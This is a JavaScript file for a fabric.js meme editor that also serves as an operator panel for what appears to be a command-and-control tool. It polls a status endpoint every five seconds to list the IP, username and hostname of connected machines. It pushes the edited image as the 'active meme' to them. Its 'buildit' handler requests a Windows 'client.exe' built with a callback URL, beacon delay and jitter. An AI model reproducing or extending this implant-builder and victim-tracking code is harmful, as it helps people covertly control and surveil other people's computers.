const $ = (id) => document.getElementById(id);

let canvasWidth, canvasHeight;

[canvasWidth, canvasHeight] = $("resolution").value.split(',');

function resizeCanvas(e) {
    let canvasWidth, canvasHeight;
    [canvasWidth, canvasHeight] = $("resolution").value.split(',');
    canvas.setDimensions({ width: canvasWidth, height: canvasHeight });

    var cc = document.querySelector(".canvas-container");
    var c = document.querySelector("#canvas");
    cc.style.width = `${c.width}px`;
};

$("resolution").addEventListener("change", resizeCanvas);

const canvas = new fabric.Canvas('canvas', {
    width: canvasWidth,
    height: canvasHeight,
    backgroundColor: '#000000',
    allowTouchScrolling: true,
});

canvas.renderAll();

const grid = document.querySelector('.grid');

const msnry = new Masonry(grid, {
    itemSelector: '.grid-item',
    columnWidth: '.grid-sizer',
    percentPosition: true
});

const setCanvasImage = (img) => {
    const backgroundColor = canvas.backgroundColor;

    canvas.clear();
    canvas.backgroundColor = backgroundColor;

    if ($("scale-to-fit").checked) {
        img.scale(fabric.util.findScaleToFit(img, canvas));
    }

    canvas.add(img);
    canvas.centerObject(img);
    canvas.setActiveObject(img);
    canvas.renderAll();

}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Delete') {
        for (const obj of canvas.getActiveObjects()) {
            canvas.remove(obj);
            canvas.discardActiveObject();
        }
    }
});

$("background-color").addEventListener('change', function (e) {
    canvas.backgroundColor = e.target.value;
    canvas.renderAll();
});

// Handle image upload
$('upload-image').addEventListener('change', function (e) {
    const reader = new FileReader();
    reader.onload = function (event) {
        const imgElement = new Image();

        imgElement.src = event.target.result;

        imgElement.onload = async (e) => {
            setCanvasImage(await fabric.Image.fromURL(event.target.result));
        };
    };
    reader.readAsDataURL(e.target.files[0]);
    e.target.value = "";
});

// Add Text to the Canvas
$('add-text').addEventListener('click', function () {
    const fontSize = parseInt($('font-size').value);
    const fontColor = document.getElementById('font-color').value;
    const text = new fabric.Textbox('Your text here', {
        left: 50,
        top: 50,
        fontSize: fontSize,
        fill: fontColor,
        hasControls: true,
        lockUniScaling: true
    });
    canvas.add(text);
    canvas.setActiveObject(text);
});

// Add Shape to the Canvas (Rectangle as an example)
$('add-shape').addEventListener('click', function () {
    const shape = new fabric.Rect({
        left: 150,
        top: 100,
        fill: $("shape-color").value,
        width: 100,
        height: 100,
        hasControls: true,
        lockUniScaling: true
    });
    canvas.add(shape);
    canvas.setActiveObject(shape);
});

$('download').addEventListener('click', () => {
    const link = document.createElement('a');
    link.download = 'photo_editor_image.png';
    link.href = canvas.toDataURL();
    link.click();
});

$('ocd-center-me-please').addEventListener('click', () => {
    canvas.getObjects().forEach((obj) => {
        canvas.centerObject(obj);
    });

    // Disable object movement, scaling, etc., when color picker is active
    canvas.renderAll();
});

$("sendit").addEventListener('click', () => {
    fetch('/set_active_meme', {
        method: 'POST',
        body: canvas.toDataURL(),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});

fetch('/list_images')
    .then(response => response.json())
    .then(images => {
        const container = document.querySelector(".grid");

        images.forEach(imagePath => {
            const imageDiv = document.createElement('div');
            imageDiv.classList.add('grid-item');

            const imgElement = document.createElement('img');
            imgElement.src = imagePath;
            imgElement.alt = imagePath;

            imgElement.addEventListener('click', function () {
                setCanvasImage(new fabric.Image(this));
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });

            imageDiv.appendChild(imgElement);

            container.appendChild(imageDiv);
        });
    })
    .catch(error => console.error('Error fetching the image list:', error)).finally(() => {
        msnry.layout();
    });

// Get the drawer and buttons
const drawer = $("drawer");
const drawerTop = $("drawer-top");

// Open the drawer-left
$("open-btn").addEventListener("click", async () => {
    await getMemedomStatus();
    drawer.style.left = "0";  // Slide the drawer in from the left
});

// Close the drawer-left
$("close-btn").addEventListener("click", () => {
    drawer.style.left = "-500px";  // Slide the drawer back out of view
});

// Open the drawer-top
$("open-btn-top").addEventListener("click", async () => {
    drawerTop.style.top = "0";  // Slide the drawer in from the left
});

// Close the drawer-top
$("close-btn-top").addEventListener("click", () => {
    drawerTop.style.top = "-500px";  // Slide the drawer back out of view
});

// Store fetched data to track items by ip, username, and hostname
const itemData = {};

// Function to fetch data and display it as divs
async function getMemedomStatus() {
    try {
        const response = await fetch('/status'); // Replace with your actual endpoint
        const data = await response.json(); // Assuming the endpoint returns JSON

        // Find the container where the results will be added
        const container = document.getElementById('results-container');
        
        // Loop through the array of objects and process the data
        data.forEach(item => {
            const key = `${item.ip}_${item.username}_${item.hostname}`; // Composite key for each unique item
            const currentTimestamp = new Date();
            let displayDiv;

            // Check if the item already exists in the data
            if (itemData[key]) {
                // If the item exists, compare timestamps and update the display if it's changed
                const lastTimestamp = itemData[key].timestamp;
                const lastUpdateTime = new Date(lastTimestamp);
                const timeDiff = Math.floor((currentTimestamp - lastUpdateTime) / 1000); // Time difference in seconds
                
                // Update the timestamp in the stored data
                itemData[key].timestamp = item.timestamp;

                // Update the div to show the time since last change
                displayDiv = itemData[key].div;
                displayDiv.querySelector('.timestamp').textContent = `Updated: ${timeDiff} seconds ago`;
                displayDiv.classList.add('updated');
            } else {
                // If the item is new, create a new div
                displayDiv = document.createElement('div');
                displayDiv.classList.add('result-div');
                displayDiv.classList.add('new');
                displayDiv.innerHTML = `
                    <p><strong>IP:</strong> ${item.ip}</p>
                    <p><strong>Username:</strong> ${item.username}</p>
                    <p><strong>Hostname:</strong> ${item.hostname}</p>
                    <p class="timestamp">New!!!</p>
                `;
                
                // Store the new item and its div reference
                itemData[key] = { timestamp: item.timestamp, div: displayDiv };
                container.appendChild(displayDiv);
            }
        });
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

setInterval(getMemedomStatus, 5000);


$("buildit").addEventListener("click", async () => {
    drawerTop.style.top = "-500px";  // Slide the drawer back out of view

    let url = $("client-callback-url").value;
    let delay = $("client-callback-delay").value;
    let jitter = $("client-callback-jitter").value;
    let flavor = $("client-flavor").value;
    let bgpath = $("host-background-path").value;

    fetch('/buildit', {
        method: 'POST',
        body: JSON.stringify({
            "url": url,
            "delay": delay,
            "jitter": jitter,
            "os": "windows",
            "flavor": flavor,
            "background": bgpath,
        }),
    })
    .then(async (response) => {

        const downloadLink = document.createElement('a');
        downloadLink.href = URL.createObjectURL(await response.blob());
        downloadLink.download = 'client.exe';

        downloadLink.click();
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});